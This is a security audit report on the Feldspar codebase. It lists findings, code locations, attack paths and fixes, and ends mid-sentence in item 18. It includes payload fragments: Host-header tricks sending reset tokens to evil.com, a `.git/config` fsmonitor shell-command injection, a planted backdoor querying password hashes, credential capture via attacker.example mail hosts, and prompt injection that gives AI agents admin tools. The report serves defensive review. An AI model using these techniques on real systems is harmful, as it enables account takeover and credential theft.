# Security review — October 2026

General security review of the Feldspar codebase (branch `security-review`, base commit `f138c773`),
looking for information leakage, privilege escalation, remote code execution, session hijacking and
related flaws.

A second review (items 15 onward, base commit `5993840c`) follows the first; see
"Second review — October 2026" below.

**Method.** Six read-only reviews ran in parallel, one per attack surface: authentication & sessions,
API authorization, SQL/formula injection, code execution & SSRF, files/uploads/backups, and output
encoding / live / MCP / webhooks. Nothing was built or executed. Findings marked **(verified)** were
re-checked against the source; the others are as reported by the reviewer that found them, with the
code path traced but no exploit run. Line numbers are as of the base commit.

## Summary

| # | Severity | Issue | Status |
|---|----------|-------|--------|
| 1 | Critical | Password-reset / invite links built from raw `Host` header → account takeover | **fixed** |
| 2 | High | OAuth completion token redirected to an unvalidated start host → session theft | **fixed** |
| 3 | High | Trigger-started agents run as role 1 → prompt injection gets admin tools / shell | **fixed** |
| 4 | High | Non-admin coding-agent callers can run host commands (scripts/check/build, `.git/config`) | **fixed** |
| 5 | Med–High | Stored XSS via uploads served inline on the app origin | **fixed** |
| 6 | Medium | CSRF double-submit beatable by cookie tossing from a sibling subdomain | **fixed** |
| 7 | Medium | Saltcorn-UI `/auth/login` has no login throttling | **fixed** |
| 8 | Medium | Non-admin writes to `users.email` / `disabled` / admin-added columns | **fixed** |
| 9 | Medium | OAuth treats missing `email_verified` as verified and links by email | **fixed** |
| 10 | Medium | Deno modules read arbitrary host files via dynamic `import("file://…")` | **fixed** |
| 11 | Med–Low | Module can borrow another in-flight call's caller via guessable `callId` | **fixed** |
| 12 | Med–Low | `.git` served on public file routes; symlinks followed out of store root | **fixed** |
| 13 | High (Windows) | Backslash path traversal in file-store paths | **fixed** |
| 14+ | Low | See "Low / hardening" | reported |

Items 1 and 2 share a root cause (trusting the `Host` header) and should be fixed together.
Items 1–5 are fixed; see the CHANGELOG entry "Security fixes: Host header, OAuth host, agent
privileges, uploads". Items 6–8 are fixed; see "Security fixes: CSRF cookie tossing, UI login
throttle, `users` columns". Items 9 and 10 are fixed; see "Security fixes: OAuth
`email_verified`, Deno `import()` fence". Items 11–13 are fixed; see "Security fixes: module call
tokens, `.git` and symlinks, Windows paths". Items 3, 4 and 12 together describe the main routes to running code as the server's OS user.

---

## Critical / High

### 1. Critical — password-reset and invite links built from the `Host` header (verified)

- `crates/sc-server/src/router.rs:2630-2652` — `RequestLinks::new` stores the raw `Host` header;
  `own_origin` returns `format!("{scheme}://{host}")`.
- `crates/sc-api/src/rest/password.rs:366-381` — `link_origin` uses `own_origin()` unchecked;
  called by `forgot_password` (`:295`) and `invite` (`:227`).
- `crates/sc-server/src/apps.rs:1417` — `subdomain_of` truncates the host at the first `:`, so
  `Host: blog.example.com:@evil.com` still resolves to app `blog`.

**Attack.** Unauthenticated: `POST https://blog.example.com/api/forgot-password
{"email":"admin@corp"}` with `Host: blog.example.com:@evil.com`. The endpoint is public, so the CSRF
layer passes it as anonymous. The victim receives a genuine email with
`https://blog.example.com:@evil.com/…#token=T`; the browser treats `blog.example.com` as userinfo and
navigates to evil.com, whose JS reads `T` from `location.hash`. The attacker redeems it via
`set-password`. The users table is instance-wide, so this works against admins through any app.
The doc comment on `RequestLinks` ("a link is never built to a host a caller made up") is only true
of `app_origin`.

**Fix.** Build `own_origin` from the configured base domain + resolved app subdomain (and port from
config), never from the raw header. Have the router refuse malformed `Host` values (userinfo `@`,
multiple `:` outside IPv6 brackets, etc.).

### 2. High — OAuth completion token sent to an unvalidated host (verified)

- `crates/sc-server/src/oauth.rs:373` — `let host = request_host(&headers)` is stored in the pending
  flow with no validation.
- `oauth.rs:572-578` — the callback redirects to `{scheme}://{pending.host}/…/complete?token=…`.
- `oauth.rs:764-766` — `complete` only checks the stored host equals the request `Host`.
- Unknown hosts fall through to the admin side (`resolve_app` → `Resolved::Admin`).

**Attack.** Attacker calls `/_feldspar/oauth/google/start` with `Host: attacker.com`; the
`redirect_uri` still uses the real `callback_host`, so the provider accepts it. Attacker keeps the
`sc_oauth` binding cookie and sends the victim the genuine provider URL. After the victim signs in,
the callback redirects their browser to `https://attacker.com/…/complete?token=T`. The attacker
replays `/complete?token=T` with the spoofed `Host` and the binding cookie and receives the victim's
`sc_session` — admin, for an admin-login flow.

**Fix.** Validate the start host against the admin host and mounted app hosts; same router-level
`Host` validation as #1.

### 3. High — agents started by triggers run as admin (verified)

- `crates/sc-agent/src/agent_trait.rs:375-379` — `RunCaller::system()` is `role: 1`.
- `crates/sc-core-traits/src/run_agent.rs:160` — every trigger-started run uses `RunCaller::system()`.
- `crates/sc-core-traits/src/coding.rs:512-519` — shell, process and module-install tools are offered
  when `cx.caller.is_some_and(is_admin)`; `admin_copilot.rs:362` uses the same role check.

**Attack.** An admin wires `run_agent` to an event a low-privilege or public user controls (insert into
a publicly writable table, an inbound webhook, a public action) and the prompt formula includes that
user's data. A prompt injection in that data then runs with admin authority: with `may_use_shell` it
runs `bash -c` as the server's OS user (reading `feldspar.toml`, DB credentials); with
`admin_copilot` it can create code-bearing triggers; with `may_install_modules` it can `npm install`
an attacker package. Even without those, `query_table`/`update_rows` bypass ownership.

**Fix.** Give triggered runs a distinct "system" marker that never satisfies `is_admin` for the shell,
process, module-install and copilot tools, or require a separate explicit opt-in per trigger.

### 4. High — non-admin callers can execute host commands through coding agents (verified)

- `crates/sc-core-traits/src/coding.rs:498-503` — `may_run_scripts` and `may_check` are not gated on
  the caller's role (unlike the shell at `:512`).
- `crates/sc-core-traits/src/coding/script.rs:85-110` — `run_script` only checks the script name is
  declared in `package.json`, which the agent can write itself, then runs `npm run <x>` on the host.
- `check` / `build_application` → `crates/sc-app/src/build.rs:1021,1324` run `sh -c <package.json
  script>` and the bundler unsandboxed with the server's environment (a model-written
  `vite.config.js` suffices).
- `crates/sc-files/src/local.rs:77-92` (`resolve`) rejects only `..`; nothing on the write path
  (`sc-files/src/git.rs:1091`, `sc-core-traits/src/files.rs:140-152,240-247,296`) refuses `.git/`.
  Writing `.git/config` with `core.fsmonitor = "sh -c '…'"` (or `core.sshCommand`, `core.pager`, or a
  `.git/hooks/*` file) executes on the next `git status`/`add`/`commit` — and `run_git_operation`
  runs status after every operation (`git.rs:1426`; `coding/commit.rs:120,134`).
  `.git/config` has no owner, so `check_write` passes on the path floor alone.

**Attack.** A staff user chatting with an agent that has `may_edit` plus any of `may_run_scripts`,
`may_check`, `build_application` or `commit` (agent `min_role` ≤ their role, `chat.rs:494`) gets
arbitrary command execution as the server user. This sidesteps the stated rule that the shell is
admin-only "because it runs as the server's own operating-system user".

**Fix.** Gate scripts/check/build with `is_admin` like the shell, or force the container sandbox for
them. In `LocalFileStore::resolve` (or the git wrapper) refuse any path segment equal to `.git`
(case-insensitive) for writes, and hide it from non-admin reads/listings.

### 5. Medium–High — stored XSS via uploads served inline (verified)

- `crates/sc-server/src/uploads.rs:299-318` — MIME is derived from the filename and only checked
  when `slot.mime_allow` is non-empty; the default is empty, so `.html`, `.svg`, `.xhtml`, `.js` are
  accepted. File fields behave the same.
- `crates/sc-server/src/file_response.rs:209-231` — served with the guessed `Content-Type` and
  `Content-Disposition: inline` unless `?download=1`.
- `crates/sc-server/src/router.rs:1806-1810` — app `/files/serve/*` responses get only the app CSP,
  no `sandbox`. `sc-files/src/access.rs` (`clears`) makes a file with no floor public.
- Module-stored files can set an arbitrary `contentType` (`sc-module/src/files.rs:177`), e.g. a mail
  module storing an external attachment as `text/html`.

**Attack.** Any user able to upload (including anonymous on a public slot) uploads `x.html` (and
`x.js`). On Saltcorn-UI apps the CSP is `script-src 'self' 'unsafe-inline'`
(`sc-viewpattern/src/framework.rs:232`) so inline script runs; on strict-CSP apps
`<script src="/files/serve/…/x.js">` satisfies `'self'` and passes `nosniff`. Script runs as any app
user who opens the link. If "Share sign-in between applications" is on, the admin session cookie is
sent to app hosts and `/admin/agent-chat` and `/ide/lsp/{store}` are routed on every host with only
an Origin == Host check (`router.rs:913-969`), so the script can drive the admin agent chat.

**Fix.** Add `Content-Security-Policy: sandbox` (or `default-src 'none'`) to file responses; force
`attachment` for HTML/SVG/XML/JS (allow inline only for a safe list: raster images, PDF, audio/video);
refuse admin sockets (`agent-chat`, LSP, `stream_observe`, `fit_progress`) on app hosts. Longer term,
serve user content from a separate origin.

---

## Medium

### 6. CSRF double-submit beatable by cookie tossing (verified)

`crates/sc-server/src/security.rs:556-610` accepts a mutating request when the `sc_csrf` cookie equals
the header or `_csrf` form field. The token is not bound to the session and the cookie name
(`sc-api/src/auth.rs:29`) has no `__Host-` prefix. Script on any sibling subdomain (finding 5, an
app's own code, a preview host) can set `sc_csrf=X; Domain=<base>` and submit a form-encoded POST
with `_csrf=X` to another app or the admin host; the `SameSite=Strict` session cookie is still sent
because the hosts are same-site. JSON endpoints are protected in practice by the lack of CORS
preflight answers; Saltcorn-UI form routes are exposed.

**Fix.** Rename to `__Host-sc_csrf`, or make the token an HMAC of the session id and verify it
server-side. Use constant-time comparison while there.

**Fixed:** behind TLS the cookie is `__Host-sc_csrf` and only that name is read; the comparison is
constant-time. A plain-`http` server keeps `sc_csrf` (the prefix requires `Secure`) and so is not
protected against tossing — development only.

### 7. No login throttling on Saltcorn-UI `/auth/login` (verified)

`crates/sc-viewpattern/src/framework.rs:839-852` calls `sc_auth::authenticate` directly;
`throttle::login_attempt`/`login_failed` are only called from `handlers.rs:212` and
`rest/mod.rs:1088`. Unlimited online password guessing against any instance account (admins
included) through any Saltcorn-UI app. **Fix:** route through the same throttle.
**Fixed:** same throttle and keys; `429` with `Retry-After`.

### 8. Non-admins can write sensitive `users` columns (verified)

`crates/sc-api/src/user_rows.rs:150-226` (`check_insert`, `update_guard`) only constrains `role` and
`password_hash`. `email`, `disabled` and admin-added columns (`tenant_id`, `org_id`, …) are
unchecked on generic REST, GraphQL and sync writes (invites do refuse them via
`SYSTEM_USER_COLUMNS`, `rest/password.rs:431`).

- **Takeover of a weaker account:** with `users` `min_role_write` 40, a role-40 user changes a role-80
  user's `email` to their own, then uses the public `forgot-password` to get a reset link and signs
  in as the victim, gaining everything the victim's ownership formulas grant.
- **Cross-tenant:** with a self-edit formula `id === user.id` on `users` and `org_id === user.org_id`
  elsewhere, a user sets their own `org_id` and the next request's `caller_context` opens another
  tenant's rows.
- `disabled` can be cleared on an account an admin disabled.

**Fix.** Treat `SYSTEM_USER_COLUMNS` as admin-only writes in `update_guard`/`check_insert`, and add a
per-field "admin-only write" flag for admin-added columns that drive authorization.

**Fixed:** below admin, an update may not name `email`, `disabled` or a different `id`, and no
write may name a field with `"admin_only_write": true`. The admin UI has no toggle for the flag yet.

### 9. OAuth: missing `email_verified` treated as verified (reported)

`crates/sc-server/src/oauth.rs:666-670` (`_ => true`) plus `account_for` (`:704-748`) link to any
existing user by email, including admins when `admin_login` is on. The Microsoft preset uses the
`common` tenant and Graph userinfo, which sends no `email_verified`; the email is tenant-admin
controlled ("nOAuth"). An attacker with their own Entra tenant sets a user's mail to an existing
admin's address and signs in as them. **Fix:** default to unverified; require a per-provider
"emails are verified" opt-in.

**Fixed:** a missing `email_verified` is unverified unless the provider's `trust_emails` ("Trust
unverified addresses") is ticked; GitHub falls through to `/user/emails`. The Microsoft preset takes a
`tenant`, and `trust_emails` is refused for `common`/`organizations`/`consumers`, so a Microsoft
provider must name its own directory.

### 10. Deno module sandbox: file reads via dynamic `import()` (reported)

`crates/sc-module/src/deno/wiring.rs:142-160` — `HostModuleLoader` wraps `FsModuleLoader` without a
permission check; only `require()` goes through `ensure_read_permission` (`:214`). A module with the
closed permission set (e.g. a compromised npm dependency) can
`import("file:///any/path.json", {with:{type:"json"}})` to read JSON the server user can read, probe
paths, or run `.js` from anywhere. **Fix:** reject `file:` specifiers outside the module root in
`resolve`/`load`, or check them against the module's permission container.

**Fixed:** `ModuleFence` checks each `file:` load (canonicalised): modules root, the view runtime
bundle, or a path the container grants for reading; anything else gets the read-denial error.

### 11. Module can borrow another call's authority (reported)

`crates/sc-module/src/deno/worker.rs:379` (`host_ask`) takes `callId` from JS and `:1064` routes to
any in-flight call with that id. Code in a shared worker can pass the id of a concurrent admin call
and have its DB requests run as the admin. Code bodies already use 128-bit tokens for this
(`sc-expr/src/code.rs`). **Fix:** unguessable per-call tokens, or bind each request to its module.

**Fixed:** each call is named by a random v4 UUID (`CallToken`), used for `__scAsk`, `__scDbCall`,
`__scDone` and `__scFail`. Modules sharing an isolate are still not isolated from each other in
general (shared global, prototypes); the permission-based worker split remains the boundary.

### 12. `.git` served publicly; symlinks followed (reported)

- `crates/sc-viewpattern/src/framework.rs:1670-1707` — `confined()` allows `.git`, and a store's
  `min_role` defaults to public (`sc-files/src/def.rs:176`). A git store in an app's store list with no
  floor serves `/files/serve/<store>/.git/config` (remote URLs with tokens), history, `.env` files.
- `crates/sc-files/src/local.rs` reads/writes through `resolve` with no canonicalize/prefix check, so
  a symlink committed upstream (`uploads -> /etc`) is followed for reads and writes after a pull.

**Fix.** Deny `.git` (and probably dotfiles) on public serve routes; canonicalize the parent and check
the root prefix, or open with `O_NOFOLLOW` / `openat2(RESOLVE_BENEATH)`.

**Fixed:** `check_access` refuses `.git` below admin and listings hide it; app `/files/serve` 404s
any dot-segment. `LocalFileStore` canonicalises the deepest existing part of each path and refuses
anything outside the root, dangling links included; delete/rename act on a link itself. This is a
check before the open, so a link swapped in mid-request (TOCTOU) is not covered.

### 13. High on Windows — backslash path traversal (reported)

`crates/sc-files/src/local.rs:79-90` splits on `/` only then `PathBuf::push(seg)`;
`sc-files/src/reference.rs:44-57` (`validate_file_path`, used for File-field writes at
`rows.rs:1513`) does not reject `\` or drive prefixes. On Windows (a stated target, GOALS.md:208)
`uploads/..\..\..\Windows\win.ini` escapes the root and skips folder floors in `check_access`; a
segment like `C:\x` replaces the whole path. `confined()`, `clean_relative` and git pathspecs already
reject `\`. **Fix:** in `resolve`, reject segments containing `\`, `:` or NUL and require every
`Path::components()` item to be `Normal`.

**Fixed** as suggested, plus segments made only of dots and spaces. `validate_file_path` refuses
the same characters.

---

## Low / hardening

- **Template `{{= x }}` re-interpolation** (`crates/sc-expr/src/template.rs:382-413`): stored row data
  is re-parsed as a template and evaluated without schema validation, with `row`, `user`, `old`,
  `payload`, `session` bound. A user can inject `{{! … }}` raw HTML into HTML emails (quote-free
  payloads survive escaping) or read `{{ user.email }}`. No RCE (formula isolate has no ops). Validate
  nested templates, forbid `{{!` in re-interpolated values, and document the risk.
- **Markdown plugin** (`plugins/markdown/feldspar_markdown/plugin.py:33-45`) emits raw HTML and
  `javascript:` links. Offer a sanitising default (nh3/bleach) and a separate raw opt-in.
- **Row history leaks `password_hash`**: change-log triggers store `to_jsonb(NEW/OLD)`
  (`sc-catalog/src/change_log.rs:257-258`) and `history::redacted` (`sc-api/src/history.rs:312`)
  strips only Secret fields. Admin-only today, reachable by non-admins through code bodies if
  `history_min_role` is lowered. Restoring a deleted user also always fails. Apply
  `user_rows::is_hidden_column` in `redacted`/`writable`.
- **Invites relay arbitrary mail** (`rest/password.rs` `invite`/`invite_template`): caller-chosen
  `from`/subject/body; `Resent` path unthrottled. Restrict `from` to configured senders; throttle.
- **Stan program filename shell injection** (`sc-stan/src/program/mod.rs:305`, `compile.rs:210-212`):
  names are passed as `make` targets, which CmdStan interpolates unquoted into `sh`. Needs an admin to
  select the file. Restrict to `[A-Za-z0-9_./-]`.
- **`npm install` without `--ignore-scripts`** (`sc-module/src/install.rs:701`); no integrity pinning
  for git/tarball sources. Admin-only.
- **Headless browser reaches IP literals** (`sc-server/src/browser/driver.rs:222`):
  `--host-resolver-rules MAP * ~NOTFOUND` doesn't cover `169.254.169.254` / `127.0.0.1`. Add a
  blackhole proxy or request interception.
- **`is_public` IPv6 gaps** (`sc-email/src/relay.rs:196`): 6to4 (`2002::/16`) and Teredo
  (`2001::/32`) can embed private IPv4.
- **Fetch URL templates don't URL-encode values** (`sc-core-actions/src/fetch.rs:148`): row data can
  inject `/../`, `?`, `#` into requests carrying admin-configured API headers.
- **Git argument injection (admin-only)**: `git.rs:471-475` (`clone`) and `:850-862` (`checkout`)
  lack `--` and a leading-`-` check.
- **Backup/spool file modes**: `spool.rs:63` and `destination.rs:431` create files with the default
  mode; backups contain password hashes, the Secret-field key, LLM keys and the TLS private key. Use
  0600 files / 0700 directories.
- **Decompression bombs** (admin-only): `geo_import/shapefile.rs:72`, `backup/archive.rs:194-198`.
- **CSV formula injection**: `sc-api/src/csv.rs:798-804` exports `= + - @` cells verbatim.
- **Webhook 500 bodies** (`sc-server/src/webhooks.rs:166`) return module error text to
  unauthenticated callers.
- **No HSTS header**, although the server terminates TLS itself.
- **Session cleanup after password reset**: `redeem_password_token` uses the free
  `delete_sessions_for_user`, skipping cache eviction and live-socket listeners — a hijacked session
  survives up to 60 s per node.
- **Login timing** (`sc-auth/src/login.rs:51-58`) returns before argon2 for unknown emails →
  enumeration.
- **Login throttle**: in-process (limits multiply with nodes), email limit counted only on failure
  (concurrent bursts pass), per-IP key is the full IPv6 address.
- **`createFirstUser` race** on an empty database (acknowledged in `first_user.rs`).
- **GraphQL filter/sort** (`graphql/args.rs:209,283`) use `table.field()` rather than
  `filter::queryable_field` and skip the Secret refusal; currently protected only by the generated
  input types.
- **Dataset updates** (`sc-server/src/analytics.rs:316-329`) accept a new `base` without
  `check_base`; reads are still guarded, but close it.
- **SQL hardening (not exploitable today)**: `DO $sc$ … $sc$` blocks inline names without a tag
  check (`sc-db-postgres/src/ddl.rs:213-224`, `sc-api/src/csv.rs:662-673`); `is_sql_type_name`
  (`sc-query/src/dialect.rs:737`) is too permissive; literal quoting assumes
  `standard_conforming_strings=on`; GeoPackage import leaves `trusted_schema` on.
- **MCP `mcp_loopback_only`** checks only the TCP peer (`sc-server/src/mcp.rs:759`), so behind a
  same-host proxy every caller looks local (bearer token still required).
- **Fake payment provider** checkout/portal routes are unauthenticated; ensure it cannot be enabled
  in production.
- **Backups as code**: restore recreates admins, triggers, modules and code; a crafted backup can
  point a local store at an existing host path (`relocate_for_restore`). Document that backups must
  be trusted.

---

## Checked and found sound

- **SQL**: values always bound; identifiers quoted with doubled quotes on both dialects; LIMIT/OFFSET
  bound; formula→SQL translation has no general function-call path (no `pg_read_file`, `dblink`,
  `set_config`); RLS GUCs set via bound `set_config($1,$2,true)`; custom REST SQL is admin-authored,
  single-statement, typed binds.
- **Sessions**: fresh 244-bit token on every login (no fixation); stored as SHA-256; cookie
  `HttpOnly` + `SameSite=Strict`, `Secure` with TLS; disabled users and grants re-read within 60 s.
- **Password tokens**: 256-bit, hashed, single-use, 1 h reset / 7 d invite; redemption clears other
  tokens and sessions; forgot-password throttled and non-enumerating.
- **API tokens**: hashed, revocation/expiry checked, admin re-checked per use, bearer-only `/mcp`.
- **Roles**: signup/OAuth never yield role 1; invites strictly weaker; `grant_role` refuses role 1.
- **Redirects**: `return_to`/`dest`/`redirect` reject `//`, `\`, control chars. PKCE S256, single-use
  `state`. `X-Forwarded-For` trusted only from configured proxies.
- **Authorization**: all typed admin endpoints gated `admin()`; REST updates check ownership on both
  old and merged rows plus a `WHERE` guard; deletes check the existing row; denials are 404;
  embeds/joins go through `join_guard`; sync pull/push via `read_rows_as`/`write_as`; undo limited to
  own changesets.
- **Live / WebSockets**: every upgrade checks Origin; user topics forced to the caller; per-subscriber
  read checks re-evaluated on change.
- **MCP**: off by default; refuses any `Origin` (DNS rebinding); bearer-only.
- **Payment webhooks**: HMAC over raw body with constant-time compare, 300 s window, provider
  re-fetch, idempotent event insert, 1 MiB cap, rate limited.
- **Headers**: `X-Frame-Options: DENY`, `nosniff`, `Referrer-Policy` everywhere; no CORS layer.
- **Files**: upload filename sanitising (basename, UUID prefix); zip-slip refused in restore; mode
  masked to `0o777`; access model applies cumulative floors and owner rule to list/search/find;
  `Content-Disposition` RFC 5987.
- **SSRF**: agent `http` tool filters resolved addresses, re-checks every redirect hop, handles
  IPv4-mapped/NAT64.
- **Deno defaults**: closed permission set; no run/FFI/remote import; env hidden.

## Not covered in depth

Vendored v1 JS view renderers (`ui/saltcorn-ui`, `sc-viewpattern` bundles), the Astro server-render
path, and the CmdStan makefile behaviour (for the Stan filename item).

## Recommended order

1. Host-header trust (#1, #2) — one router-level fix plus link construction from config.
2. Agent privilege (#3, #4) — role gate on scripts/check/build, system-run marker, `.git` write refusal.
3. File serving (#5, #12) and CSRF cookie (#6).
4. UI login throttle (#7), `users` column guard (#8), OAuth `email_verified` (#9).
5. Module sandbox (#10, #11), Windows paths (#13), then the low/hardening list.

---
---

# Second review — October 2026

A second general review of the whole system, on branch `security-review1` at base commit `5993840c`
(after the fixes for items 1–13 above). Line numbers are as of that commit.

**Method.** Seven read-only reviews ran in parallel: a re-review of fixes 1–13 looking for
bypasses; payments and LLM credits; rendering, XSS and Astro server rendering; data-access
authorization (REST, GraphQL, sync, history, live, datasets); code execution and sandboxes; mail,
outbound network, webhooks and TLS; and privileged surfaces, app-exposed agents and operations.
Nothing was built or executed. Findings marked **(verified)** were re-checked against the source
after the reviewer reported them; the others are as reported, with the code path traced by the
reviewer but no exploit run. Items already in the first review's Low list are not repeated unless
they turned out worse than stated.

## Summary

| # | Severity | Issue | Status |
|---|----------|-------|--------|
| 15 | High | `/upload`, `/download`, `/backup/*` accept an admin session on application hosts | **fixed** |
| 16 | High | Non-admin file edits become admin-authority server code (Astro entry, build files, LSP binary) | **partly fixed** |
| 17 | High | `mail_test_account` sends a shared account's saved password/token to a host the caller picks | **fixed** |
| 18 | High | Order lines can change between checkout and payment; the paid order delivers the new basket | **fixed** |
| 19 | Med–High | Repeated trials give unlimited plan roles and LLM credits | **fixed** |
| 20 | Medium | Exposed agents: anonymous visitors act as the agent's `view_app_user` | **fixed** |
| 21 | Medium | Exposed agents re-open admin tools (shell, copilot, modules) to app-origin script | **fixed** |
| 22 | Medium | No rate limit or spending cap on exposed agents; signup unthrottled | **partly fixed** |
| 23 | Medium | Formula isolate allows full JS via `constructor`, shared and persistent, no heap limit | **fixed** |
| 24 | Medium | Astro scaffold publishes rows of every API table to anonymous visitors | **fixed** |
| 25 | Medium | Prerendered / refreshed Astro pages served to callers the app does not admit | **fixed** |
| 26 | Medium | Unauthenticated CPU/memory exhaustion through Astro `/_image` | **fixed** |
| 27 | Medium | `fetch` action with a templated host is an SSRF that returns the response | **fixed** |
| 28 | Medium | REST create/update and GraphQL delete return rows the caller may not read | **fixed** |
| 29 | Medium | Offline-sync pull lists the keys of changed rows the caller cannot read | **fixed** |
| 30 | Medium | Module workers: `__scDbCall` is writable, so any module can capture other calls' tokens | **fixed** |
| 31 | Medium | `.git` guard checks the spelling of a path, not where it lands (symlinks, `GIT~1`) | **fixed** |
| 32 | Medium | The "triggered" marker is lost across trigger chains | **fixed** |
| 33 | Medium | Test-mode / fake payment accounts grant real roles and credits | **partly fixed** |
| 34 | Medium | Chargebacks and partial refunds never revoke a purchase's role or credits | **fixed** |
| 35 | Medium | Polar customers bound to users by email (suspected) | **fixed** |
| 36+ | Low | See "Second review: Low / hardening" | reported |

Items 15, 17 and 18 are fixed and 16 partly (its short-term list); see the CHANGELOG entry
"Security fixes: admin routes on app hosts, edit-to-execute, mail test credentials, order lines".
Items 19–21 and 23–27 are fixed and 22 partly (no per-exposure daily budget); see the CHANGELOG
entry "Security fixes: repeat trials, exposed agents, formula isolate, Astro, `/_image`, `fetch`".

Items 28–32, 34 and 35 are fixed and 33 partly (no server dev flag for the fake adapter, no
warning on the module card); see the CHANGELOG entry "Security fixes: write responses, sync keys,
module bridge, `.git` links, trigger chains, payments".

Items 15, 16, 20 and 21 are the main new routes to admin authority; 15 and 21 are the same class
as the first review's #5 (admin session reachable from app-origin script) on routes its fix did not
cover. 16 is the same class as #4 ("whoever may edit decides what runs") on routes that fix did
not cover.

---

## Second review: High

### 15. High — admin file and backup routes accept an admin session on application hosts (verified)

- `crates/sc-server/src/router.rs:320,326,338-339` register `/upload/{store}/{*path}`,
  `/download/{store}/{*path}`, `/backup/create` and `/backup/upload` as real axum routes, matched on
  every `Host` before `dispatch`/`resolve_app`.
- `upload` (`:651-664`), `download` (`:722-737`), `create_backup` (`:776-780`) and `upload_backup`
  (`:837-841`, via `admin_of` `:894-905`) check only `session_user` + `AuthRequirement::admin()`.
  None calls `admin_host_only` (`:915-929`), which the #5 fix added only to the LSP, agent-chat,
  observe and fit-progress sockets.
- Sessions are not bound to the host that issued them (`session_user` `:3433-3450`).

**Attack.** Script running on any application origin — the app's own code (writable by staff
through coding agents), HTML injection in a Saltcorn-UI app (`'unsafe-inline'`), an agent-written
preview — while an admin's session cookie reaches that host (shared sign-in on, or simply the admin
having signed in to that app). The script reads the host's own `__Host-sc_csrf` and calls
`POST /backup/create`: the response is the whole instance (password hashes, Secret-field key, LLM
keys, TLS private key). `/download` and `/upload` read and write any file store, including other
apps' source; `/backup/upload` stages a crafted backup. A second route is `call_api`
(`sc-core-traits/src/coding/call_api.rs:224-260`, `sc-server/src/requests.rs:70-100`), which sends
agent-chosen paths through this router: a prompt-injected triggered run whose `view_app_user` is an
admin can POST `/backup/create`.

**Fix.** Call `admin_host_only` in all four handlers, or put every admin-only real route behind a
host-guard layer. Longer term, bind each session to the host scope it was issued for and refuse
app-issued sessions on admin routes; refuse admin paths in `call_api`.

**Fixed:** all four call `admin_host_only` and are a 404 on application and preview hosts;
`call_api` always sends to an application's host, so it is refused too. Sessions are still not
bound to a host.

### 16. High — non-admin file edits become admin-authority server code (verified)

The #4 fix stops a non-admin caller from *running* scripts, checks and builds, but not from writing
the files those later run, nor the Astro server entry that runs on every request.

- `crates/sc-core-traits/src/files.rs:239-255` (`open_to_write`) refuses only `.git`; write access is
  the store's read floor (`sc-files/src/access.rs:220-233`), public by default (`def.rs:176`). Build
  output has no owner.
- **Astro server entry.** `crates/sc-app/src/server_render.rs:12-20,543-568`: `dist/_server/entry.js`
  runs through `run_code_traced` with admin authority — `db`, `db.sql`, `fs`, `fetch` (unfiltered,
  `code_fetch.rs:26-30`) and `trigger()` skipping the target's `min_role`
  (`sc-api/src/code_host/triggers.rs:187`). The bundle is read from the output directory in the file
  store (`sc-app/src/build.rs:387-397`) and mounted with no build at boot / SIGHUP
  (`sc-server/src/apps.rs:1300-1316`) and by a coding run's preview (`apps.rs:1113,1131-1146`, from
  `coding/view_app.rs:265-294`). `may_view_app` is not admin-gated (`coding.rs:508`).
- **Build inputs.** `package.json`, bundler configs, lockfiles and `node_modules/**` are writable;
  they run as the server user at the admin's next build or check (`apps.rs:1220-1255`,
  `build.rs:1021,1324,1408`) or, for `.astro` frontmatter, as admin-authority code after the build.
- **Language server.** `crates/sc-server/src/lsp.rs:307-333` (`local_server_bin`) prefers the
  store's own `node_modules/.bin/typescript-language-server`; an overwritten file keeps its exec bit
  and runs when an admin opens the IDE.
- Suspected: a repository whose hooks path is inside the working tree lets the agent edit hooks that
  `commit` (`coding/commit.rs:120-135`) runs.

**Attack.** A staff user with an edit-capable coding agent over an Astro project (the framework's
intended use; also a triggered run fed injected data, which keeps `may_edit` and `view_app`) writes
`site/dist/_server/entry.js` returning `await db.sql("select email,password_hash from users")`,
then calls `view_app goto /`. The result comes back in the snapshot; after the next restart the
same file serves every anonymous visitor — a persistent backdoor with admin row, file and trigger
authority.

**Fix.** Below admin (and for triggered runs), refuse writes to the build output directory,
`node_modules/`, `package.json`, lockfiles and `*.config.*`; never mount an unbuilt `dist/` for a
non-admin `view_app` (require an admin-built preview); have the LSP use only the server's own
binary; pass `--no-verify -c core.hooksPath=/dev/null` on agent commits. Longer term, run Astro
entries at the visitor's authority by default (like `TableHost::viewer_only`) with admin authority
an explicit per-app opt-in, run builds in the container sandbox, and give stores a separate write
floor.

**Fixed (the short-term part):** below admin, `check_write` refuses build inputs
(`sc_files::controls_build`: `package.json`, lockfiles, package-manager rc files, `*.config.*`,
`node_modules/**`) on every write route; the agent file tools also refuse them to triggered runs,
and refuse application build output directories; `view_app` mounts no unbuilt output for a
non-admin run; the LSP runs only `--language-server` (default: on `PATH`); agent commits disable
hooks. Not done: build scripts named by a build command (`sh build.sh`), output-directory writes
through routes other than the agent tools, and the longer-term items.

### 17. High — `mail_test_account` leaks a shared mail account's credentials (verified)

- `plugins/imap/actions.js:273-300` (`testAccount`) copies every `ACCOUNT_FIELDS` value from the
  payload, including `imap_host` and `smtp_host`. With `account_id` it loads the saved row through
  `readable()` (`:92-96`, a *read* check) and fills in only fields the payload left empty or as the
  sentinel — the passwords — plus, for OAuth accounts, the access and refresh tokens (`:290-292`).
  Module reads return Secret fields decrypted (`sc-module/src/services.rs:40-42`).
- Shared accounts (`owner === null`) are readable by every user at or above their `min_role`
  (`plugins/imap/index.js:193`); `crates/sc-module/tests/imap_ingest.rs:489-492` tests a non-admin
  doing exactly this.

**Attack.** A user who can read shared account X and run `mail_test_account` posts
`{"account_id": X, "imap_host": "imap.attacker.example", "smtp_host": "smtp.attacker.example"}`.
The attacker's server has a valid public certificate, so TLS verification passes; imapflow and
nodemailer send X's IMAP/SMTP username and password (or the XOAUTH2 token — full mailbox scope for
Gmail) in the login. One call is enough; the 5/minute limit is irrelevant.

**Fix.** When `account_id` is given and any host, port, security mode or username differs from the
saved row, do not fill in saved secrets or tokens. Alternatively, allow saved secrets only to the
owner, or to an admin for a shared account (the rule `mail_oauth_start` uses).

**Fixed** as the first suggestion: a changed address, host, port, security mode or user refuses
the call unless the payload gives every secret that login would use.

### 18. High — an order's lines can change between checkout and payment

- The lines are priced once when the checkout is made (`plugins/payments/checkout.js:151-182,222`)
  and stored on the mirror row (`:351-375`). Processing never compares what was paid, or the
  current lines, with what was charged (`processing.js:232-273,339-346`); only `amount` reaches
  `pay_events`.
- The tutorial's ownership rules let the buyer write `order_lines` while the order is `open`
